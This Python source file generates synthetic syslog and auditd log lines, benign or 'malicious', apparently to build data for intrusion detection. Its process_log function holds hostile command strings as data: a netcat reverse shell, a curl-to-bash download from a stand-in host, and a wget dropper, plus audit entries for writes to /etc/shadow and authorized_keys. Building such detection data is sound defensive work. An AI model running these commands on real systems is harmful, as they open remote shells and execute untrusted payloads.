import random
from utils import (
    random_ip,
    random_user,
    timestamp_syslog,
    timestamp_epoch,
    is_attack_wave
)

HOSTNAME = ["server01", "server02", "web01", "db01", "laptop01", "laptop04"]


def kernel_log(malicious=False):
    benign = [
        "eth0: link up",
        "eth0: link down",
        "CPU frequency scaling enabled",
        "Disk sda mounted",
        "USB device connected",
        "Bluetooth: hci0 device initialized",
        "systemd-journald started",
    ]
    malicious_msgs = [
        "EXT4-fs error (device sda1)",
        "Kernel panic - not syncing",
        "Out of memory: Kill process",
        "thermal throttling activated",
        "watchdog: BUG: soft lockup"
    ]
    msg = random.choice(malicious_msgs if malicious else benign)
    return f"{timestamp_syslog()} {random.choice(HOSTNAME)} kernel: {msg}"


def auth_log(malicious=False):
    methods = ["password", "publickey", "keyboard-interactive"]
    pid = random.randint(1000, 9000)
    port = random.randint(1024, 65535)
    user = random_user()
    ip = random_ip()

    if malicious:
        return (
            f"{timestamp_syslog()} {random.choice(HOSTNAME)} sshd[{pid}]: "
            f"Failed {random.choice(methods)} for {user} "
            f"from {ip} port {port}"
        )
    return (
        f"{timestamp_syslog()} {random.choice(HOSTNAME)} sshd[{pid}]: "
        f"Accepted {random.choice(methods)} for {user} "
        f"from {ip} port {port}"
    )


def service_log(malicious=False):
    services = [
        "nginx", "apache2", "mysql", "docker",
        "ssh", "cron", "rsyslog", "network-manager", "postfix"
    ]
    benign_actions = ["Started", "Stopped", "Restarted", "Reloaded", "Scheduled restart job"]
    malicious_actions = ["Failed", "Stopped", "Killed"]

    action = random.choice(malicious_actions if malicious else benign_actions)
    return (
        f"{timestamp_syslog()} {random.choice(HOSTNAME)} systemd[1]: "
        f"{action} {random.choice(services)}.service"
    )


def process_log(malicious=False):
    benign_cmds = [
        "python app.py",
        "curl http://example.com",
        "bash",
        "ls -la",
        "systemctl status ssh",
        "df -h",
        "uptime"
    ]
    malicious_cmds = [
        "nc -e /bin/sh 10.0.0.1 4444",
        "curl http://malicious.site/payload.sh | bash",
        "wget http://bad.site/dropper -O /tmp/a && chmod +x /tmp/a",
        "python -c 'import socket,os,pty'"
    ]
    cmd = random.choice(malicious_cmds if malicious else benign_cmds)
    return (
        f"type=EXECVE msg=audit({timestamp_epoch()}:{random.randint(100,999)}): "
        f"user={random_user()} cmd=\"{cmd}\""
    )


def filesystem_log(malicious=False):
    benign_paths = [
        "/var/log/syslog",
        "/etc/hosts",
        "/etc/resolv.conf",
        "/usr/share/doc",
        "/home/user1/.bashrc",
        "/opt/app/config.yaml"
    ]
    malicious_paths = [
        "/etc/shadow",
        "/etc/passwd",
        "/root/.ssh/authorized_keys",
        "/tmp/malware.sh",
        "/dev/shm/payload",
        "/var/tmp/.x"
    ]
    path = random.choice(malicious_paths if malicious else benign_paths)
    perm = "w" if malicious else "r"
    return (
        f"type=PATH msg=audit({timestamp_epoch()}:{random.randint(100,999)}): "
        f"name=\"{path}\" perm=\"{perm}\" user={random_user()}"
    )


def generate():
    malicious = is_attack_wave()

    generators = [
        lambda: kernel_log(malicious),
        lambda: auth_log(malicious),
        lambda: service_log(malicious),
        lambda: process_log(malicious),
        lambda: filesystem_log(malicious),
    ]

    return random.choice(generators)()